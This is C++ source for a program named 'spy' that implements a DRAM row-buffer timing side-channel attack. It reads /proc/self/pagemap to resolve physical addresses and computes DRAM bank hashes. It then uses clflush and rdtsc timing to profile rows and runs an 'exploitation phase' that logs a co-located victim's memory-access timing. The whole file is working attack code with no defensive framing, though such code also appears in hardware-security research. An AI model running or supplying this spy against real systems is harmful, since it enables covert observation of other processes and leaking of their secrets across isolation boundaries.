#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <vector>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <signal.h>
#include <time.h>
#include <stdlib.h>
#include <sched.h>
#include <stdint.h>

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

void maccess(void* p)
{
  asm volatile ("movq (%0), %%rax\n"
    :
    : "c" (p)
    : "rax");
}

void flush(void* p) {
    asm volatile ("clflush 0(%0)\n"
      :
      : "c" (p)
      : "rax");
}

size_t conflict_mem[1024*1024];
void* conflict_ptr[32];

std::vector<size_t> sets;
std::vector<std::vector<void*>> pages_per_row;

// The fraction of physical memory that should be mapped for testing.
double fraction_of_physical_memory = 0.7;

// Obtain the size of the physical memory of the system.
uint64_t GetPhysicalMemorySize() {
  struct sysinfo info;
  sysinfo( &info );
  return (size_t)info.totalram * (size_t)info.mem_unit;
}

#define assert(X) do { if (!(X)) { fprintf(stderr,"assertion '" #X "' failed\n"); exit(-1); } } while (0)
#define DIMMS (2)
// this number varies on different systems
#define MIN_ROW_CONFLICT_CYCLES (220)

int pagemap = -1;
// Extract the physical page number from a Linux /proc/PID/pagemap entry.
uint64_t frame_number_from_pagemap(uint64_t value) {
  return value & ((1ULL << 54) - 1);
}

size_t get_dram_row(void* phys_addr_p) {
  uint64_t phys_addr = (uint64_t) phys_addr_p;
  return phys_addr >> 18;
}

size_t get_dram_mapping(void* phys_addr_p) {
  uint64_t phys_addr = (uint64_t) phys_addr_p;
  static const size_t h0[] = { 14, 18 };
  static const size_t h1[] = { 15, 19 };
  static const size_t h2[] = { 16, 20 };
  static const size_t h3[] = { 17, 21 };
  static const size_t h4[] = { 7, 8, 9, 12, 13, 18, 19 };

  size_t count = sizeof(h0) / sizeof(h0[0]);
  size_t hash = 0;
  for (size_t i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }
  count = sizeof(h1) / sizeof(h1[0]);
  size_t hash1 = 0;
  for (size_t i = 0; i < count; i++) {
    hash1 ^= (phys_addr >> h1[i]) & 1;
  }
  count = sizeof(h2) / sizeof(h2[0]);
  size_t hash2 = 0;
  for (size_t i = 0; i < count; i++) {
    hash2 ^= (phys_addr >> h2[i]) & 1;
  }
  count = sizeof(h3) / sizeof(h3[0]);
  size_t hash3 = 0;
  for (size_t i = 0; i < count; i++) {
    hash3 ^= (phys_addr >> h3[i]) & 1;
  }
  count = sizeof(h4) / sizeof(h4[0]);
  size_t hash4 = 0;
  for (size_t i = 0; i < count; i++) {
    hash4 ^= (phys_addr >> h4[i]) & 1;
  }
  return (hash4 << 4) | (hash3 << 3) | (hash2 << 2) | (hash1 << 1) | hash;
}

uint64_t get_physical_addr(uint64_t virtual_addr) {
  uint64_t value;
  off_t offset = (virtual_addr / 4096) * sizeof(value);
  int got = pread(pagemap, &value, sizeof(value), offset);
  assert(got == 8);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = frame_number_from_pagemap(value);
  return (frame_num * 4096) | (virtual_addr & (4095));
}


size_t evict_array[1024*1024/8];

size_t conflictandreaccess(void* addr, void* addr2, size_t duration)
{
  size_t count = 0;
  size_t time = 0;
  size_t delta = 0;
  size_t end = rdtsc() + duration * 1000*1000;
  while(time < end)
  {
    flush(addr);
    time = rdtsc();
    maccess(addr);
    delta = rdtsc() - time;
    flush(addr2);
    maccess(addr2);
    if (delta < MIN_ROW_CONFLICT_CYCLES)
    {
      count++;
    }
    sched_yield();
  }
  return count;
}

size_t kpause = 0;
void doconflictandreaccess(void* addr, void* addr2)
{
  flush(addr);
  size_t time = rdtsc();
  maccess(addr);
  size_t delta = rdtsc() - time;
  flush(addr2);
  maccess(addr2);
//  flush(addr);
  if (delta < MIN_ROW_CONFLICT_CYCLES)
  {
    if (kpause > 10000) // you will have many subsequent row hits because the row will be open for a while
    {
      //putchar('.');
      printf("%lu,%lu,%lu,Hit\n", time, delta, kpause);
      fflush(stdout);
    }
    kpause = 0;
  }
  else
  {
  //  if ((kpause % 1000000) == 999999)
  //    printf("%lu,%lu,%lu,Miss\n", time, delta, kpause);
    kpause++;
  }
}

void doloop(void* p, void* p2)
{
  size_t end = time(0) + 30; // exploitation phase for 30 seconds
  while(time(0) < end)
  {
    doconflictandreaccess(p,p2);
    sched_yield();
  }
}

int main(int argc, char** argv)
{
  if (argc != 2)
    exit(!fprintf(stderr,"  usage: ./spy <probeduration>\n"
                 "example: ./spy 200             \n"));
  size_t duration = 0;
  if (!sscanf(argv[1],"%lu",&duration))
    exit(!printf("duration error\n"));
  size_t mapping_size = static_cast<uint64_t>((static_cast<double>(GetPhysicalMemorySize()) * fraction_of_physical_memory));

  void* mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE,
      MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  assert(mapping != (void*)-1);

  // Initialize the mapping so that the pages are non-empty.
  //fprintf(stderr,"[!] Initializing large memory mapping ...");
  for (uint64_t index = 0; index < mapping_size; index += 0x400) {
    *(uint64_t*) (((char*)mapping) + index) = index * 37;
  }
  //fprintf(stderr,"done\n");

  pagemap = open("/proc/self/pagemap", O_RDONLY);
  assert(pagemap >= 0);

  size_t conflict_sets = 0;
  for (size_t i = 1024; i < 1023*1024; i += 8)
  {
    maccess(conflict_mem + i);
    size_t set = get_dram_mapping((void*)get_physical_addr((uint64_t)(conflict_mem + i)));
    if (conflict_ptr[set] == 0)
    {
      conflict_ptr[set] = conflict_mem + i;
      conflict_sets++;
    }
    if (conflict_sets == 32)
      break;
  }
  if (conflict_sets != 32)
    exit(32);
    
  size_t page_count = 0;
  //fprintf(stderr,"[!] Identifying rows for accessible pages ... ");
  for (uint64_t offset = 0; offset < mapping_size; offset += 0x1000) { // maybe * DIMMS
    uint8_t* virtual_address = static_cast<uint8_t*>(mapping) + offset;
    uint64_t physical_address = get_physical_addr((uint64_t)virtual_address);
    uint64_t presumed_row_index = get_dram_row((void*)physical_address);
    if (presumed_row_index > pages_per_row.size()) {
      pages_per_row.resize(presumed_row_index);
    }
    pages_per_row[presumed_row_index].push_back(virtual_address);
    page_count++;
    //printf("[!] done\n");
  }
  //fprintf(stderr,"Done\n");

  while (1)
  {
    fprintf(stderr,"ready? profiling starts in 1 second...\n");
    sleep(1);
    size_t i = 0;
    char j = 0;
    size_t count = 0;
    size_t promille = 0;
    printf("set,row,hits\n");

    for (uint64_t row_index = 0; row_index < pages_per_row.size(); ++row_index) { // scan all rows
      i++;
      if (pages_per_row[row_index].size() > 32 || pages_per_row[row_index].size() == 0)
        continue;
      for (void* p : pages_per_row[row_index])
      {
        maccess(p);
        flush(p);
        size_t set = get_dram_mapping((void*)get_physical_addr((uint64_t)p));
        size_t row = get_dram_row((void*)get_physical_addr((uint64_t)p));
        if (row != row_index)
          continue;
        size_t collision = 0;
        for (void* px : pages_per_row[row_index])
        {
          size_t setx = get_dram_mapping((void*)get_physical_addr((uint64_t)px));
          size_t rowx = get_dram_row((void*)get_physical_addr((uint64_t)px));
          if (set == setx && row == rowx && px != p)
            collision = 1;
        }
        if (collision)
          continue;
        printf("%2ld,%6ld,",set,row);
        void* p2 = conflict_ptr[set];
        maccess(p);
        maccess(p2);
        sched_yield();
        flush(p);
        flush(p2);
        count = conflictandreaccess(p, p2, duration);
        printf("%4ld\n",count);
        if (count > 10)
        {
          fprintf(stderr,"ready? exploitation starts in 1 second...\n");
          sleep(1);
          doloop(p,p2);
          fprintf(stderr,"ready? profiling continues in 1 second...\n");
          sleep(1);
        }
        if (1000 * i / page_count > promille)
        {
          promille = 1000 * i / page_count;
          fprintf(stderr,"%ld/1000\n",promille);
        }
      }
    }
  }
  return 0;
}

